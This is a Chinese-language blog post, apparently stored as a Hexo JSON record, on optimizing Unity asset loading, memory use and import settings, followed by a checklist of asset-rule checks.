\n检查纹理是否过大:过大的纹理资源会更多的消耗内存;Custom Parameters: heightThreshold : 512widthThreshold : 512;纹理大于 512 * 512 ;       \n检查Aniso级别:检查Inspector -> Aniso Level滑动条;纹理资源的Aniso级别大于1;Aniso级别大于1的纹理资源会增加内存占用和采样率;纹理资源的Aniso级别不应大于1;                \n检查纹理资源的过滤模式:纹理的过滤模式一般不建议使用Trilinear，会占用较高的计算资源。 检查Inspector -> Filter Mode选项;纹理使用了Trilinear过滤模式;          \n检查纹理资源alpha通道:如果纹理包含空的alpha通道，则应禁用'Alpha源'标志，否则会浪费这部分的内存。 检查Inspector -> Alpha Source选项;应禁用具有空Alpha通道的纹理的‘Alpha源’标志;          \n检查纯色纹理:纯色纹理的使用可能可以由一些设置来代替。由于某些情况下纯色纹理是必不可少的，此警告仅会在所使用的纹理较大(>16*16)时才会触发。纯色纹理会浪费内存;        \nTexture edge transparent;边缘有较大透明部分的纹理应裁剪以节省内存;边缘有较大透明部分的纹理应裁剪以节省内存;检查纹理透明边缘;边缘有较大透明部分的纹理应裁剪以节省内存;           \n检查纹理重复环绕模式:Repeat Wrap模式可能会导致纹理上出现意外的边缘; 检查Inspector -> Wrap Mode选项;重复环绕模式可能会导致纹理上出现意外的边缘;     \n检查重复纹理:检查重复纹理;纹理重复          \n检查雪碧图纹理填充率:填充率是雪碧图分割后的有效面积与总面积的比率，较低的雪碧图纹理填充率会导致显存的浪费。Custom Parameters: fillRateThreshold : 0.5onlyCheckSprite : True; 尝试重新编排雪碧图，尽量缩小总面积以提高填充率;sprite填充率低于 0.5\n```\n\n* 9 Audio\n```\n启用Force to Mono:检查Inspector -> Force To Mono选项:应为音频资源启用forceMono,如不需要立体声,开启forceMono可以减少内存和磁盘占用;音频应该启用forceMono，以节省存储和内存;      \n检查iOS平台的音频压缩格式:检查Inspector -> iOS Tab -> Compression Format选项;iOS平台的音频剪辑应使用MP3格式;        \n检查安卓平台的音频压缩格式:检查Inspector -> Android Tab -> Compression Format选项;安卓平台的音频剪辑应使用Vorbis格式;       \n检查音频加载类型:检查Inspector -> (Platform Tab) -> Load Type选项;有多少的短音效应使用DecompressOnLoad;有多少的的常规音效应使用CompressedInMemory;有多少的音乐应该使用Streaming;        \n```\n\n* 10 EditorSetting\n应设置CompanyName;检查公司名称设置;检查File -> Build Settings -> Player Settings -> Player -> Company Name的设置;CompanyName不应设置为DefaultCompany;                       \n应设置Build Target Icons;应设置Build Target Icons;检查Build Target图标;检查File -> Build Settings -> Player Settings -> Player -> Default Icon的设置;应设置 %s 的Build Target Icons;                        \n应设置开启GraphicsJobs;这项设置会为图形任务开启多线程. 但这个是实验性质的, 会引起新的问题. 请自行测试;检查GraphicsJobs设置;检查Editor -> Project Settings -> PlayerSettings -> Graphic Jobs(Experimental)*的设置;尝试开启graphicJobs并测试;                     \n应设置开启BakeCollisionMeshes;这项设置可以减少加载/初始化的时间, 虽然会增加一些构建时间和包体积;检查BakeCollisionMeshes设置;检查Editor -> Project Settings -> PlayerSettings -> PreBake Collision Meshes的设置;如果在项目中启用了physics, 可以考虑开启Prebake Collision Meshes选项;                 \n应设置开启StripEngineCode;关闭StripEngineCode会增加包体积;检查StripEngineCode设置;检查Editor -> Project Settings -> PlayerSettings -> Strip Engine Code的设置;关闭StripEngineCode会增加包体积;                  \n在Physics设置中应关闭AutoSyncTransforms;AutoSyncTransforms选项是为了兼容老版本的Unity而设立的, 会增加CPU的使用;检查Physics中的AutoSyncTransforms设置:检查Editor -> Project Settings -> Physics -> Auto Sync Transforms的设置;在Physics设置中开启AutoSyncTransforms会增加CPU的使用;                   \n在Physics设置中LayerCollisionMatrix中的格子不应该都勾选上;这会增加CPU的负担, 应该取消勾选那些没有必要的格子;检查Physics设置中的LayerCollisionMatrix设置;检查Editor -> Project Settings -> Physics -> Layer Collision Matrix的设置;在Physics设置中LayerCollisionMatrix中的格子不应该都勾选上;                         \n在Physics2D设置中应关闭AutoSyncTransforms;AutoSyncTransforms选项是为了兼容老版本的Unity而设立的, 会增加CPU的使用;检查Physics2D中的AutoSyncTransforms设置;检查Editor -> Project Settings -> Physics2D -> Auto Sync Transforms的设置;在Physics2D设置中开启AutoSyncTransforms会增加CPU的使用;          \n在Physics2D设置中LayerCollisionMatrix中的格子不应该都勾选上;这会增加CPU的负担, 应该取消勾选那些没有必要的格子;检查Physics2D中LayerCollisionMatrix设置;检查Editor -> Project Settings -> Physics2D -> Layer Collision Matrix的设置:在Physics2D设置中LayerCollisionMatrix中的格子不应该都勾选上;                            \nStandardShaderQuality选项在所有Graphics Tier中应相同:这会增加编译时间和包体积, 除非你想要支持很多性能跨度很大的设备;检查Graphics中StandardShaderQuality设置;检查Editor -> Project Settings -> Graphics -> Tiers -> Standard Shader Quality的设置;StandardShaderQuality选项在所有Graphics Tier中应相同;             \nAndroid设置中的ManagedStrippingLevel选项不应为Low或者Disabled:这会增加包体积;检查Android的ManagedStrippingLevel设置;检查Editor -> Project Settings -> PlayerSettings -> Managed Stripping Level的设置;ndroid设置中的ManagedStrippingLevel选项应为Medium或者High;        \niOS设置中的Architecture选项不应为Universal;这会增加包体积. 如果工程并不准备支持32位的 iOS 设备, 将其设为 ARM64;检查iOS的Architecture设置;检查Editor -> Project Settings -> PlayerSettings -> Architecture的设置;iOS设置中的Architecture选项不应为Universal;\niOS设置中的AccelerometerFrequency选项应为 Disabled;如果项目没有用到设备的加速度计, 禁用 AccelerometerFrequency 可以节省一些 CPU 处理时间;检查iOS的AccelerometerFrequency设置;检查Editor -> Project Settings -> PlayerSettings -> Accelerometer Frequency的设置;iOS设置中的AccelerometerFrequency选项应为 Disabled;                \n在 iOS 的 GraphicsAPIs 设置里应只包含 Metal:如果设备支持Metal, 在 GraphicsAPIs 里只开启 Metal 可以减少包体积和得到更好的 CPU 表现;检查iOS的GraphicsAPIs设置;检查Editor -> Project Settings -> PlayerSettings -> GraphicsAPIs的设置;在 iOS 的 GraphicsAPIs 设置里应只包含 Metal;           \n\"Editor iOSManagedStrippingLevel Setting\":iOS设置中的ManagedStrippingLevel选项不应为Low;这会增加包体积;检查iOS的ManagedStrippingLevel设置;检查Editor -> Project Settings -> PlayerSettings -> Managed Stripping Level的设置;iOS设置中的ManagedStrippingLevel选项应为Medium或者High;                 \n不建议使用Resources系统来管理asset;使用Resources系统可能会延长程序的启动时间。此系统已经过时，不建议使用。检查项目目录下是否存在Resources文件夹;不建议使用Resources系统来管理asset;     \n```\n\n11 Mesh\n```\nMesh Read&Write Flag:应为网格资源禁用读/写标志;开启Mesh资源的读/写标志会导致双倍的内存占用;检查网格资源读/写标记;网格资源应禁用读/写标志;       \n```\n\n12 Model\n```\nModel Read&Write Flag;应为模型资源禁用读/写标志;开启M资源的读/写标志会导致双倍的内存占用;检查模型资源读/写标记;模型资源应禁用读/写标志;     \n```\n13 Video\n```\n导入的视频文件大小应小于某一限制，默认为256MB;检查视频大小;导入的视频文件体积不应过大;视频大小限制;;      \n```","source":"_posts/Unity/Optimize/Unity资源优化.md","raw":"---\ntitle: Unity 资源优化\ndate: 2020-05-08 11:41:32\ntop: 11\ncategories:\n- Unity优化\ntags:\n- Unity优化\n---\n\n# 资源加载模块的核心问题\n\n***\n\n## 1:加载时瓶颈?\n\n\n引擎阶段(加载阶段)|人工阶段(加载阶段)       \n------|-------     \n上一场景资源卸载 |       \n当前场景资源加载  |      \n当前场景加载后处理(GC耗时,GO销毁)      | 当前场景中,资源加载,\n当前场景实例化          | 当前场景中,AB 加载 ,实例化\n当前场景Active/Deactive | 当前场景中的 GameObject,Active/Deactive,实际初始化设置.\n\n引擎函数|人工函数       \n------|---     \nEarlyUpdate.UpdatePreloading|PreLateUpdate.ScriptRunBehaviourLateUpdate\nLoading.UpdatePreloading|LateBehaviorUpdate;  AssetBundles.Loadxxx 加载,\nUpdatePreloading|(ToLua 第三方库) LuaLooper.LateUpdate;\nApplication.WaitForAsyncOperationToComplete|\nPreload Sing Step(真正耗时的函数)|\nApplication.LoadLevelAsync;    GarbageCollectAssetsProfile(卸载上一个场景的函数,这个函数是调用 Resources.UnloadUnusedAssets();产生的(手动或者自动触发),会有大量耗时记录)|\n;    Loading.LoadFileHeaders(Loading ReadObject,这一系列函数表示在加载新场景,读取头文件,读取GameObject),LoadAwakeFromLoad(加载后处理,mesh,shader,Shader.Parse)|\nUnityEngine.SetupCoroutine(Coroutine InvokeMoveNext)(Instantiate实例化,Active,Deactive)|\nGC.Collect;    GC.FindLiveObjects,GC.MarkDependencies;UnloadScene|\n\n***\n\n## 2:资源加载是否合理?\n\n\n### 纹理\n* 1:Mac Size,分辨率尽量小于 1024,长宽需要是 2 的幂次方.\n* 2:Format,格式尽量选用 Unity 官方推荐的格式.\n* 3:Read/Write 尽量关闭\n* 4:Mipmap 尽量关闭\n* 5:Texture streaming\n\n### 网格\n* 1:Model 里面的 Meshs 设置,资源的顶点数量与顶点属性数量\n* 2:Mesh Compression 尽量选 On\n* 3:Read/Write Enabled 尽量不勾选 \n* 4:Normals尽量让 Unity 自己计算\n* 5:Blend Shape Normals\n* 6:Tangents 尽量少\n* 7:Swap UVs 尽量不勾选\n* 8:Generate Lightmap UVs,尽量不勾选\n* 9:以上选择,全是为了数据量小而选择的,不为了表现,如果为了表现,需要进行取舍\n\n### 动画片段\n* 1:片段数量\n* 2:压缩模式/动画精度/数据精度\n* 3:动画模式,Humanoid要比Generic 小很多\n\n### 音频片段\n\n* 1:音频数量,\n* 2:加载方式,Load Type-->选择 Streaming 是最快的\n* 3:压缩格式,Compression Format-->PCM(不压缩),Vorbis(ogg 的格式),ADPCM(轻度压缩),MP3\n* 4:内存最小的选择是  :加载方式选择Streaming,压缩格式选择Vorbis,Vorbis 的 Quality 可以进一步控制,建议 50%\n* 5:建议使用 MP3 格式的音频文件,如果内存压力过大,可以考虑 Streaming 加载方式或较小 Quality 质量的 Vorbis 格式\n* 6:如果是非及时使用音效(背景音乐),建议开启 Load in Background 来提升加载效率\n* 7:如果 存在大量频繁使用的音效,建议选择 Decompressed On Load 来降低 CPU 开销\n\n###  Particle System\n\n* 1:粒子系统数量\n* 2:材质,很多粒子加载,会将相同Material 加载进内存.\n\n\n### 资源加载卸载的 API\n\n* 1:Resources.Load\n* 2:Resources.LoadAsync\n* 3:AssetBundle.Load\n* 4:AssetBundle.LoadAsync\n* 5:异步加载时开启Application.backgroundLoadingPriority=ThreadPriority.High;表示异步操作可以在主线程的单帧花费最长时间。单帧花费时间越多，可加载的数据越多，因此帧率将有所下降，较为影响游戏性能，但可减少加载资源的时间，能更快的进入游戏！反之，单帧花费时间越少，可加载的数据越少，对游戏的游戏性能影响较小，可在游戏进行时有很好的后台加载。[官方文档](https://docs.unity3d.com/2017.1/Documentation/ScriptReference/Application-backgroundLoadingPriority.html)\n* 6:QualitySettings.asyncUploadTimeSlice = 2;为了读取数据和上传纹理数据，重复使用了一个大小可以控制的环形缓冲区。使用asyncUploadTimeSlice以毫秒为单位设置异步纹理上传的时间片框架。最小值为1，最大值为33。\n* 7:QualitySettings.asyncUploadBufferSize = 4;为了读取数据和上传纹理数据，重复使用了一个大小可以控制的环形缓冲区。设置异步纹理上传的缓冲区大小。大小的单位是兆字节。最小值为2，最大值为512。虽然缓冲区会自动调整大小以适应当前加载的最大纹理，但建议将该值设置为场景中使用的最大纹理的大小，以避免重新调整缓冲区的大小会导致性能损失。\n\n## 3:引擎如何加载一个 Prefab?\n\n为何我们调整了 资源加载卸载的API 中提到的三个参数,异步加载就变得快了.我们就要了解引擎是如何加载一个 prefab 的.一个 UI 的 Prefab 可能含有 Texture,Mesh,Material 等等很多东西.\n\n* 1:加载 Mesh 并传输到 GPU;异步串行;异步串行加载时会寻找 AssetBundle 里面含有哪些资源,然后反序列化这些资源,然后先加载这个 Prefab 的 Mesh 传到 GPU 里面;\n* 2:加载 Texture 并传输到 GPU;异步串行;\n* 3:加载 shader & Material;异步串行;前期是加载 shader,后期是主线程解析 shader\n* 4:加载 Object & Component;异步串行;\n* 5:加载 AnimationClip 资源;异步串行;完全可以放在异步里面进行加载,不会卡主线程\n* 6:加载 Audio 资源;异步串行;使用 Streaming 模式是最快的.\n* 7:大量资源的异步加载均可在子线程中进行\n* 8:主线程主要处理 AwakeFromLoad & Shader 解析\n* 9:主线程可以留出大量空间供逻辑代码使用\n\n\n***\n## 4:如何优化加载?\n\n* 1:加快 Mesh,Texture等资源的异步加载效率\n* 2:加快处理 AwakeFromLoad & Shader 解析\n* 3:Async Upload Pipeline\n> * A:加载线程异步加载 Texture 和 Mesh 资源,用了 Mesh 的压缩,需要在主线程进行解压,是不能进行异步加载的,地形的 Texture 开了 Read/Write 是不能进行异步加载的\n> * B:通过渲染线程直接将其传送到 GPU\n> * C:目前 Unity 都支持,\n> * D:代码里面异步加载方法 AsyncUploadBuffer 加载完毕之后,直接回放到渲染线程进行渲染,渲染线程中的渲染方法AsyncUploadTimeSlice将数据上传\n* 4:优化方法:将QualitySettings.asyncUploadBufferSize = 4;改为QualitySettings.asyncUploadBufferSize = 16;表示引擎从硬盘里面每次读取 4M,变为读取 16M,读取时都是在子线程.这个参数里面的 buff 缓冲可以认为是流式的读取\n* 5:优化方法:QualitySettings.asyncUploadTimeSlice = 2;改为QualitySettings.asyncUploadBufferSize = 8;表示渲染线程每一帧使用 2ms 去干活,变为渲染线程每一帧使用  8ms 去干活,有可能就多开了一个渲染线程\n* 6:AUP 让内存占用更加可控,加载 Upload Buffer 会增加一个恒定的内存,除此之外几乎没有副作用,在内存允许的情况下,可以设置 16MB 或者 32MB.对于asyncUploadTimeSlice方法,如果设置过大,会产生卡顿现象.\n* 7:压缩主线程上面的资源,控制异步加载资源在主线程的\"后加载\"耗时,各种资源的 AwakeFromLoad,Shader.Parse,设置代码 Application.backgroundLoadingPriority=ThreadPriority.High;\n* 8:Texture.AwakeFromLoad 是从主线程里面将Texture传到 GPU\n* 9:优化异步加载:调整 Upload Buffer 和 Upload Time Slice,调整 BackLoadingPriority,开启多线程渲染,调整资源的加载顺序(比如 shader)\n* 10:异步加载时需要注意代码的写法,不要搞成一帧加载很多.AssetBundle 加载的写法需要注意\n* 11:需要查看实例化操作是否合理,实例化的频率,大概需要 10K 帧有大的浮动;  一般正常的加载方式是-->AB a0-->AB a1(依赖 a0)-->加载 a1-->instantiate a1;错误加载方式-->AB a1(依赖 a0)-->加载 a1-->instantiate a1-->AB a0 这种情况下 a0 资源会出现在其他错误的地方;\n* 12:需要查看Active/Deactive操作是否合理,尤其是在 NGUI/UGUI 上面\n\n***\n## 5:资源内存\n\n* 1:有很多纹理在内存里面,但是没有进行渲染,也就是没有用到.需要查看 UI图集,技能特效.\n* 2:注意纹理的分辨率大小,以及 Mipmap 是否物尽其用\n* 3:在品质设置里面有个 Texture Streaming 选项中,有个参数:Memory Budget,在其足够时,Scene Texture 是满 Mipmap 加载,动态加载的 GO Texture 是最比配的 mipmap 进行加载和实例化,渲染时,则按照距离原因和 budget 进行调整.再其不足时,Scene Texture按照最低配加载,已加载 Streamed Texture 按照距离 Remove Mipmap,越远的越先 Remove 高 Level Mipmap ,动态加载的 GO Texture 只按最低配 Mipmap 加载,实例化和渲染.\n* 4:Max Level Reduction设定为 1 表示加载 mipmap 第一级,设置为 2 加载第二级\n* 5:在 mobile 端一定要设置 QualitySettings.streamingMipmapsActive = true;\n* 6:网格:关注顶点渲染密度.\n* 7:音频片段,Streaming 加载方式比较适合于背景音乐,对于同时播放的小音频文件,建议通过 Decompressed 方式.\n\n*** \n\n\n## 6:AB 包\n* 1:建议目前全部采用 LZ4 压缩\n* 2:本地加载,建议使用 LoadFromFile(Async)来加载\n* 3:根据机型,选择适合的 Coroutine 次数\n* 4:如果自己压缩,建议使用 Gzip+LoadFromFile(Async)来加载\n* 5:AssetBundle.LoadAll 比 Asset.Load OneByOne 要好很多.\n* 6:切换场景时,尽可能使用 AssetBundle.Load 来提升加载效率\n* 7:小,细碎的同种类资源打包在一起(Shader,ParticleSystem)\n\n\n*** \n## 7:Mono堆内存\n\n* 1:子线程 Mono 分配,多见于和服务器交互.\n* 2:Lua 内存检测,关注 Destroyed 总数.\n* 3:Instantiate 实例化频率,实例化的耗时.\n* 4:Active/Deactive 频率和耗时.复杂的界面/带有动画组件的 GameObject 不要频繁使用\n\n\n\n# 资源规范\n\n* 1 Animation \n```\n检查动画曲线精度:动画曲线精度过高会增加动画占用内存; 此规则仅面向以文本格式序列化的*.anim文件中的浮点精度;用文本编辑器打开.anim动画文件，修改m_EditorCurves::curve::m_Curve下的float值的精度。建议用脚本直接将此文件中所有float精度都调整为5位小数以下。动画曲线精度应小于5 ;       \n检查动画缩放曲线:动画不应具有缩放曲线,动画中的缩放曲线会增加动画占用内存,用文本编辑器打开.anim动画文件，确认m_EditorCurves和m_FloatCurves下不包括attribute为m_Scale的curve子对象。动画不应具有缩放曲线;\n```\n* 2 AnimationController \n```\n动画控制器中的动画剪辑个数: 动画控制器中动画剪辑数量过多会造成动画初始化耗时过多;动画剪辑个数应小于2\n```\n* 3 FBX     \n```\n检查读/写标志:开启FBX资源的读/写标志会导致双倍的内存占用;FBX资源的读/写标志应该被禁用      \n检查动画资源压缩方式:动画资源使用最佳压缩方式可以提高加载效率;查看Inspector -> Animation Tab -> Anim. Compression选项;动画资源应该使用最佳压缩方式      \n应为网格资源启用OptimizeMesh;为网格资源启用OptimizeMesh可以减少最终游戏包的大小;检查网格资源的OptimizeMesh;查看Inspector -> Model Tab -> Meshes -> Optimize mesh选项;应为网格资源启用OptimizeMesh;        \n在FBX资源中有太多的顶点, 默认阈值是500;FBX资源资源中有太多的顶点, 请检查是否必要;检查FBX资源定点数;顶点数量限制;FBX资源资源中有太多的顶点;顶点数量有多少;             \n```\n* 4 Prefab\n```\nPrefab Max Particle Limit;渲染Mesh的粒子系统不宜设置过高的粒子总数, 默认阈值为30;当粒子系统渲染Mesh时(Inspector: Particle System -> Renderer -> Render Mode == Mesh), 相比于渲染Billboard时计算资源消耗会明显上升，因此需要对粒子总数加以限制;检查最高粒子总数限制;检查Inspector -> Particle System -> Max Particles配置;渲染Mesh的粒子系统不宜设置过高的粒子总数;              \n检查粒子系统的发射速率:当粒子系统渲染Mesh时(Inspector: Particle System -> Renderer -> Render Mode == Mesh), 相比于渲染Billboard时计算资源消耗会明显上升，因此需要对粒子发射速率加以限制;检查Inspector -> Particle System -> Emission -> Rate over Time/Distance配置;渲染Mesh的粒子系统不宜设置过高的粒子发射速率, 不应超过5             \n检查Skinned Mesh Renderer:启用Skinned Motion Vectors会使渲染器同时使用当前帧和上一帧的蒙皮网络来渲染目标的动画以提高精度，从而需要双倍大小的缓冲区并占用双倍的显存;启用Skinned Motion Vectors将以消耗双倍内存为代价提高蒙皮网格的精度;      \n检查网格读/写标记:被预制件关联的网格资源应该关闭读/写标记;被预制件关联的网格资源应该关闭读/写标记       \n```\n* 5 Scene\n```\n检查场景未添加tag的GameObject:场景中的所有GameObject都应当添加tag;场景包含未添加tag的GameObject;          \nScene Multiple Audio Listeners:一个场景不应包含多个Audio Listener;一个场景不应包含多个Audio Listener;检查场景中的Audio Listener;检查场景中所有GameObject下的Audio Listener组件;场景包含多个音频侦听器;                    \n检查场景中mesh collider:Mesh Collider可以在场景中提供更精细化的碰撞检测，随之而来也会消耗大量计算资源，建议审慎使用。 检查场景中所有GameObject下的Mesh Collider组件;场景包含了mesh collider;        \n检查场景渲染设置:在移动平台，建议在渲染设置中关闭对雾的渲染以节省计算资源。检查Window -> Rendering -> Lighting Settings -> Scene -> Other Settings -> Fog选项;在移动平台，应在设置里关闭雾的渲染;           \nScene Shadow Resolution;场景中灯光的阴影分辨率应与项目设置一致;场景中灯光的阴影分辨率应与项目设置一致;检查场景阴影分辨率;检查Inspector -> Light -> Shadow Type -> Realtime Shadows -> Resolution选项，建议使用'Use Quality Settings';场景中灯光的阴影分辨率应与项目设置一致;            \nScene Rigidbody;场景中的静态GameObject不应关联Rigidbody;静态GameObject的Rigidbody模块是无用的;检查场景中的Rigidbody;静态GameObject不应关联Rigidbody;        \nScene Canvas Component;包含太多组件的Canvas可能会影响UI刷新的性能;包含太多组件的Canvas可能会影响UI刷新的性能，并进一步影响应用的帧率;检查Canvas中的component数量;包含太多组件的Canvas可能会影响UI刷新的性能;            \nScene UI Outside Screen;场景包含屏幕外的UI组件;放置在屏幕外的UI组件尽管不可见仍会消耗渲染资源，建议删掉此组件或者修正可能出现的设置错误;检查屏幕外的UI组件;场景包含屏幕外的UI组件;            \n检查场景Animator组件中的ApplyRootMotion选项:如果不需要进行根骨骼动画位移, 建议关闭场景中Animator组件的applyRootMotion选项。场景中包含勾选了applyRootMotion选项的Animator组件;       \n检查场景Animator组件中的cullingMode:场景中Animator组件的cullingMode是AlwaysAnimate会增加CPU使用率。场景中包含cullingMode为AlwaysAnimate的Animator组件;\n```\n\n* 6 Script\n```\n检查OnGUI方法:由于内存使用率高，不应使用OnGUI方法;IMGUI是过时的UI系统，仅建议在开发调试时使用。     \n检查所有的 Mono 生命周期函数 方法:空方法会导致掉帧,建议去除。     \n```\n* 7 Shader\n```\n检查Shader中纹理数量:Shader中过多的纹理可能会增加GPU消耗;Shader中的纹理个数应小于3,Shader Texture Count\n```\n\n* 8 Texture\n```\n检查纹理读/写标记:开启纹理资源的读/写标志会导致双倍的内存占用; 检查Inspector -> Advanced -> Read/Write Enabled选项;纹理资源的读/写标志应被禁用;         \n检查Mipmap标记:未压缩的纹理资源启用Mipmap标志会增加内存占用; 检查Inspector -> Advanced -> Generate Mip Maps选项;未压缩的纹理应该禁用mipmap ;        \nTexture iOS compression format;检查iOS平台的纹理压缩格式;检查iOS平台的纹理压缩格式;iOS平台纹理压缩格式;如果希望对各平台统一设置压缩格式，检查Inspector -> Default -> Format选项; 如果希望为iOS平台单独设置，打开旁边的iOS选项卡，勾选Override for iOS并检查下面的Format选项;iOS平台的纹理格式应该是astc;对iOS平台使用默认值，但格式不是Automatic;         \nAndroid平台纹理压缩格式:检查Android平台的纹理压缩格式;如果希望对各平台统一设置压缩格式，检查Inspector -> Default -> Format选项; 如果希望为Android平台单独设置，打开旁边的Android选项卡，勾选Override for Android并检查下面的Format选项;对安卓平台使用默认值，但格式不是Automatic;           \n纹理资源大小2的幂次:大小非2的幂次的纹理资源将无法使用ETC1和PVRTC压缩格式。在导入时自动伸缩为2的幂次也可能会导致内存占用或者贴图质量问题。 检查Inspector -> Advanced -> Non-Power of 2选项. 建议使用原始大小为2的幂次的贴图;纹理大小不是2的幂次;         \n检查纹理是否过大:过大的纹理资源会更多的消耗内存;Custom Parameters: heightThreshold : 512widthThreshold : 512;纹理大于 512 * 512 ;       \n检查Aniso级别:检查Inspector -> Aniso Level滑动条;纹理资源的Aniso级别大于1;Aniso级别大于1的纹理资源会增加内存占用和采样率;纹理资源的Aniso级别不应大于1;                \n检查纹理资源的过滤模式:纹理的过滤模式一般不建议使用Trilinear，会占用较高的计算资源。 检查Inspector -> Filter Mode选项;纹理使用了Trilinear过滤模式;          \n检查纹理资源alpha通道:如果纹理包含空的alpha通道，则应禁用'Alpha源'标志，否则会浪费这部分的内存。 检查Inspector -> Alpha Source选项;应禁用具有空Alpha通道的纹理的‘Alpha源’标志;          \n检查纯色纹理:纯色纹理的使用可能可以由一些设置来代替。由于某些情况下纯色纹理是必不可少的，此警告仅会在所使用的纹理较大(>16*16)时才会触发。纯色纹理会浪费内存;        \nTexture edge transparent;边缘有较大透明部分的纹理应裁剪以节省内存;边缘有较大透明部分的纹理应裁剪以节省内存;检查纹理透明边缘;边缘有较大透明部分的纹理应裁剪以节省内存;           \n检查纹理重复环绕模式:Repeat Wrap模式可能会导致纹理上出现意外的边缘; 检查Inspector -> Wrap Mode选项;重复环绕模式可能会导致纹理上出现意外的边缘;     \n检查重复纹理:检查重复纹理;纹理重复          \n检查雪碧图纹理填充率:填充率是雪碧图分割后的有效面积与总面积的比率，较低的雪碧图纹理填充率会导致显存的浪费。Custom Parameters: fillRateThreshold : 0.5onlyCheckSprite : True; 尝试重新编排雪碧图，尽量缩小总面积以提高填充率;sprite填充率低于 0.5\n```\n\n* 9 Audio\n```\n启用Force to Mono:检查Inspector -> Force To Mono选项:应为音频资源启用forceMono,如不需要立体声,开启forceMono可以减少内存和磁盘占用;音频应该启用forceMono，以节省存储和内存;      \n检查iOS平台的音频压缩格式:检查Inspector -> iOS Tab -> Compression Format选项;iOS平台的音频剪辑应使用MP3格式;        \n检查安卓平台的音频压缩格式:检查Inspector -> Android Tab -> Compression Format选项;安卓平台的音频剪辑应使用Vorbis格式;       \n检查音频加载类型:检查Inspector -> (Platform Tab) -> Load Type选项;有多少的短音效应使用DecompressOnLoad;有多少的的常规音效应使用CompressedInMemory;有多少的音乐应该使用Streaming;        \n```\n\n* 10 EditorSetting\n应设置CompanyName;检查公司名称设置;检查File -> Build Settings -> Player Settings -> Player -> Company Name的设置;CompanyName不应设置为DefaultCompany;                       \n应设置Build Target Icons;应设置Build Target Icons;检查Build Target图标;检查File -> Build Settings -> Player Settings -> Player -> Default Icon的设置;应设置 %s 的Build Target Icons;                        \n应设置开启GraphicsJobs;这项设置会为图形任务开启多线程. 但这个是实验性质的, 会引起新的问题. 请自行测试;检查GraphicsJobs设置;检查Editor -> Project Settings -> PlayerSettings -> Graphic Jobs(Experimental)*的设置;尝试开启graphicJobs并测试;                     \n应设置开启BakeCollisionMeshes;这项设置可以减少加载/初始化的时间, 虽然会增加一些构建时间和包体积;检查BakeCollisionMeshes设置;检查Editor -> Project Settings -> PlayerSettings -> PreBake Collision Meshes的设置;如果在项目中启用了physics, 可以考虑开启Prebake Collision Meshes选项;                 \n应设置开启StripEngineCode;关闭StripEngineCode会增加包体积;检查StripEngineCode设置;检查Editor -> Project Settings -> PlayerSettings -> Strip Engine Code的设置;关闭StripEngineCode会增加包体积;                  \n在Physics设置中应关闭AutoSyncTransforms;AutoSyncTransforms选项是为了兼容老版本的Unity而设立的, 会增加CPU的使用;检查Physics中的AutoSyncTransforms设置:检查Editor -> Project Settings -> Physics -> Auto Sync Transforms的设置;在Physics设置中开启AutoSyncTransforms会增加CPU的使用;                   \n在Physics设置中LayerCollisionMatrix中的格子不应该都勾选上;这会增加CPU的负担, 应该取消勾选那些没有必要的格子;检查Physics设置中的LayerCollisionMatrix设置;检查Editor -> Project Settings -> Physics -> Layer Collision Matrix的设置;在Physics设置中LayerCollisionMatrix中的格子不应该都勾选上;                         \n在Physics2D设置中应关闭AutoSyncTransforms;AutoSyncTransforms选项是为了兼容老版本的Unity而设立的, 会增加CPU的使用;检查Physics2D中的AutoSyncTransforms设置;检查Editor -> Project Settings -> Physics2D -> Auto Sync Transforms的设置;在Physics2D设置中开启AutoSyncTransforms会增加CPU的使用;          \n在Physics2D设置中LayerCollisionMatrix中的格子不应该都勾选上;这会增加CPU的负担, 应该取消勾选那些没有必要的格子;检查Physics2D中LayerCollisionMatrix设置;检查Editor -> Project Settings -> Physics2D -> Layer Collision Matrix的设置:在Physics2D设置中LayerCollisionMatrix中的格子不应该都勾选上;                            \nStandardShaderQuality选项在所有Graphics Tier中应相同:这会增加编译时间和包体积, 除非你想要支持很多性能跨度很大的设备;检查Graphics中StandardShaderQuality设置;检查Editor -> Project Settings -> Graphics -> Tiers -> Standard Shader Quality的设置;StandardShaderQuality选项在所有Graphics Tier中应相同;             \nAndroid设置中的ManagedStrippingLevel选项不应为Low或者Disabled:这会增加包体积;检查Android的ManagedStrippingLevel设置;检查Editor -> Project Settings -> PlayerSettings -> Managed Stripping Level的设置;ndroid设置中的ManagedStrippingLevel选项应为Medium或者High;        \niOS设置中的Architecture选项不应为Universal;这会增加包体积. 如果工程并不准备支持32位的 iOS 设备, 将其设为 ARM64;检查iOS的Architecture设置;检查Editor -> Project Settings -> PlayerSettings -> Architecture的设置;iOS设置中的Architecture选项不应为Universal;\niOS设置中的AccelerometerFrequency选项应为 Disabled;如果项目没有用到设备的加速度计, 禁用 AccelerometerFrequency 可以节省一些 CPU 处理时间;检查iOS的AccelerometerFrequency设置;检查Editor -> Project Settings -> PlayerSettings -> Accelerometer Frequency的设置;iOS设置中的AccelerometerFrequency选项应为 Disabled;                \n在 iOS 的 GraphicsAPIs 设置里应只包含 Metal:如果设备支持Metal, 在 GraphicsAPIs 里只开启 Metal 可以减少包体积和得到更好的 CPU 表现;检查iOS的GraphicsAPIs设置;检查Editor -> Project Settings -> PlayerSettings -> GraphicsAPIs的设置;在 iOS 的 GraphicsAPIs 设置里应只包含 Metal;           \n\"Editor iOSManagedStrippingLevel Setting\":iOS设置中的ManagedStrippingLevel选项不应为Low;这会增加包体积;检查iOS的ManagedStrippingLevel设置;检查Editor -> Project Settings -> PlayerSettings -> Managed Stripping Level的设置;iOS设置中的ManagedStrippingLevel选项应为Medium或者High;                 \n不建议使用Resources系统来管理asset;使用Resources系统可能会延长程序的启动时间。此系统已经过时，不建议使用。检查项目目录下是否存在Resources文件夹;不建议使用Resources系统来管理asset;     \n```\n\n11 Mesh\n```\nMesh Read&Write Flag:应为网格资源禁用读/写标志;开启Mesh资源的读/写标志会导致双倍的内存占用;检查网格资源读/写标记;网格资源应禁用读/写标志;       \n```\n\n12 Model\n```\nModel Read&Write Flag;应为模型资源禁用读/写标志;开启M资源的读/写标志会导致双倍的内存占用;检查模型资源读/写标记;模型资源应禁用读/写标志;     \n```\n13 Video\n```\n导入的视频文件大小应小于某一限制，默认为256MB;检查视频大小;导入的视频文件体积不应过大;视频大小限制;;      \n```","slug":"Unity/Optimize/Unity资源优化","published":1,"updated":"2020-07-09T02:27:52.945Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d0e00402gk7fw16anfl","content":"<h1 id=\"资源加载模块的核心问题\"><a 